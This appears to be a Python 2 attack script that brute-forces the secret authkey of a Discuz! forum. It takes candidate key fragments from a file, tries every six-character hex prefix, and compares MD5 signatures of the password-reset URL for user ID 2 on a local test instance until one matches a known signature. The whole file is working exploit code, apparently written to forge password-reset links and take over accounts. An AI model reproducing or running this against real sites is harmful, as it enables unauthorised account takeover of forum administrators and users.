#coding: utf-8
import itertools
import hashlib
import time
def dsign(authkey):
	url = "http://127.0.0.1:8888/discuz/"
	idstring = "xZhQzV"
	uid = 2
	uurl = "{}member.php?mod=getpasswd&uid={}&id={}".format(url, uid, idstring)
	url_md5 = hashlib.md5(uurl+authkey)
	return url_md5.hexdigest()[:16]
def main():
	sign = "6e2b1a0bb563da89"
	str_list = "0123456789abcdef"
	with open('result2.txt') as f:
		ranlist = [s[:-1] for s in f]
	s_list = sorted(set(ranlist), key=ranlist.index)
	r_list = itertools.product(str_list, repeat=6)
	print "[!] start running...."
	s_time = time.time()
	for j in r_list:
		for s in s_list:
			prefix = "".join(j)
			authkey = prefix + s
			# print authkey
			# print dsign(authkey)
			if dsign(authkey) == sign:
				print "[*] found used time: " + str(time.time() - s_time)
				return "[*] authkey found: " + authkey
print main()